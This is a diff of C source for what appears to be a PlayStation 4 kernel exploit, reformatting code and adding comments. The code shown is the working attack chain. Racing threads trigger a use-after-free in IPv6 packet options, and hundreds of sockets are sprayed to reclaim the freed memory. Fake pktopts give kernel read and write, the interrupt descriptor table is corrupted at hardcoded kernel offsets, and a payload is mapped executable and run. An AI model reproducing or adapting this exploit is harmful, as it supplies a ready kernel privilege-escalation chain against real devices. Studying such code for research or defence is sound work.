@@ -13,19 +13,18 @@
 #include <librop/pthread_create.h>
 #include <ps4/errno.h>
 
-#define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)
+#define newSocket socket(AF_INET6, SOCK_DGRAM, 0)
 
-#define IPV6_2292PKTINFO 19
+#define IPV6_2292PKTINFO    19
 #define IPV6_2292PKTOPTIONS 25
 
 // ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
-#define GET_TCLASS(name) int name(int s)\
-{\
-    int v;\
-    socklen_t l = sizeof(v);\
-    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l))\
-        *(volatile int*)0;\
-    return v;\
+#define GET_TCLASS(name) int name(int s) {                   \
+    int value;                                               \
+    socklen_t l = sizeof(value);                             \
+    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &value, &l)) \
+        *(volatile int*)0;                                   \
+    return value;                                            \
 }
 
 GET_TCLASS(get_tclass)
@@ -43,8 +42,8 @@ int set_tclass(int s, int val) {
 #define TCLASS_TAINT 0x42
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
-#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
-#define free_pktopts(s) set_pktopts(s, NULL, 0)
+#define set_rthdr(s, buf, len)   setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
+#define free_pktopts(s)          set_pktopts(s, NULL, 0)
 
 int get_rthdr(int s, char* buf, int len) {
     socklen_t l = len;
@@ -63,14 +62,15 @@ int get_pktinfo(int s, char* buf) {
 }
 
 struct opaque {
-    volatile int triggered;
-    volatile int padding;
-    volatile int done1;
-    volatile int done2;
-    int master_sock;
-    int kevent_sock;
-    int* spray_sock;
+    volatile int triggered;   // Flag indicating if the trigger has occurred
+    volatile int padding;     // Padding to ensure proper memory alignment
+    volatile int done1;       // Flag indicating completion of an operation
+    volatile int done2;       // Flag indicating completion of another operation
+    int master_sock;          // Socket used for the master thread's operations
+    int kevent_sock;          // Socket used for kevent-related operations
+    int* spray_sock;          // Array of socket descriptors for spraying
 };
+
 
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
@@ -97,25 +97,28 @@ void* free_thread(void* arg) {
     o->triggered = 1;
     o->done2 = 1;
 }
-
-void trigger_uaf(struct opaque* o) {
-    o->triggered = o->padding = o->done1 = o->done2 = 0;
-    int qqq[256];
-    pthread_create(qqq, NULL, use_thread, o);
-    pthread_create(qqq + 128, NULL, free_thread, o);
+void trigger_uaf(struct opaque* ctx) {
+    // Initialize flags and variables
+    ctx->triggered = ctx->padding = ctx->done1 = ctx->done2 = 0;
+    int threads[256];
+    pthread_create(threads, NULL, use_thread, ctx);
+    pthread_create(threads + 128, NULL, free_thread, ctx);
+    // Loop until the trigger is achieved
     for (;;) {
-        for (int i = 0; i < 32; i++)
-            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
-        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
-            break;
-        for (int i = 0; i < 32; i++)
-            if (free_pktopts(o->spray_sock[i]))
+        for (int i = 0; i < 32; i++) set_tclass(ctx->spray_sock[i], TCLASS_SPRAY);
+        if (get_tclass(ctx->master_sock) == TCLASS_SPRAY)
+            break; // Break the loop if the desired condition is met
+
+        for (int i = 0; i < 32; i++) {
+            if (free_pktopts(ctx->spray_sock[i]))
                 *(volatile int*)0;
+        }
         nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
     }
-    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
-    o->triggered = 1;
-    while (!o->done1 || !o->done2);
+    printf("uaf: %d\n", get_tclass(ctx->master_sock) - TCLASS_SPRAY);
+    ctx->triggered = 1;// Set the triggered flag
+    // Wait until both done1 and done2 flags are set
+    while (!ctx->done1 || !ctx->done2);
 }
 
 int build_rthdr_msg(char* buf, int size) {
@@ -130,8 +133,8 @@ int build_rthdr_msg(char* buf, int size) {
 }
 
 #define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
-#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
-#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
+#define PKTOPTS_RTHDR_OFFSET   (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
+#define PKTOPTS_TCLASS_OFFSET  (offsetof(struct ip6_pktopts, ip6po_tclass))
 
 int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
     free_pktopts(overlap_sock);
@@ -211,10 +214,8 @@ void pin_to_cpu(int cpu) {
 }
 
 int main() {
-    if (!setuid(0))
-        return 179;
-    for (int i = 0; i < 16; i++)
-        new_socket();
+    if (!setuid(0)) return 179;
+    for (int i = 0; i < 16; i++) newSocket;
     int tmp;
     uint64_t idt_base;
     uint16_t idt_size;
@@ -227,35 +228,39 @@ int main() {
     krop_read_cr0 = kernel_base + 0xa1b70;
     krop_read_cr0_2 = kernel_base + 0xa1b70;
     krop_write_cr0 = kernel_base + 0xa1b79;
-    int kevent_sock = new_socket();
-    int master_sock = new_socket();
+    int kevent_sock = newSocket;
+    int master_sock = newSocket;
     krop_master_sock = master_sock * 8;
     int spray_sock[512];
     int q1 = 0, q2 = 0;
-    for (int i = 0; i < 512; i++)
-        q1 += (spray_sock[i] = new_socket());
+    for (int i = 0; i < 512; i++) q1 += (spray_sock[i] = newSocket);
     printf("sockets=%d kqueues=%d\n", q1, q2);
     struct opaque o = { .master_sock = master_sock, .kevent_sock = kevent_sock, .spray_sock = spray_sock };
+    // Trigger the Use-After-Free vulnerability
     trigger_uaf(&o);
     printf("uaf ok!\n");
+    // Set the taint class to identify an overlapping socket
     set_tclass(master_sock, TCLASS_TAINT);
+    // Determine the overlapping socket index
     int overlap_idx = -1;
-    for (int i = 0; i < 512; i++)
-        if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
+    for (int i = 0; i < 512; i++) {
+        if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
             overlap_idx = i;
+        }
+    }
     printf("overlap_idx = %d\n", overlap_idx);
     if (overlap_idx < 0)
         return 1;
     int overlap_sock = spray_sock[overlap_idx];
     int cleanup1 = overlap_sock;
-    spray_sock[overlap_idx] = new_socket();
+    spray_sock[overlap_idx] = newSocket;
     overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
     printf("overlap_idx = %d\n", overlap_idx);
     if (overlap_idx < 0)
         return 1;
     overlap_sock = spray_sock[overlap_idx];
     int cleanup2 = overlap_sock;
-    spray_sock[overlap_idx] = new_socket();
+    spray_sock[overlap_idx] = newSocket;
     char buf[20];
     printf("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));
     printf("idt before corruption: ");
@@ -283,7 +288,7 @@ int main() {
     enter_krop();
     // Map and execute the spray payload
     char* spray_start = spray_bin;
-    char* spray_stop  = spray_end;
+    char* spray_stop = spray_end;
     size_t spray_size = spray_stop - spray_start;
     char* spray_map = mmap(0, spray_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
     printf("spray_map = 0x%llx\n", spray_map);
@@ -291,7 +296,7 @@ int main() {
     // Copy the spray payload into the mapped memory
     for (size_t i = 0; i < spray_size; i++)
         spray_map[i] = spray_start[i];
-   
+
     //run malloc sprays to reclaim any potential double frees
     pin_to_cpu(6);
     rop_call_funcptr(spray_map, spray_sock, kernel_base);
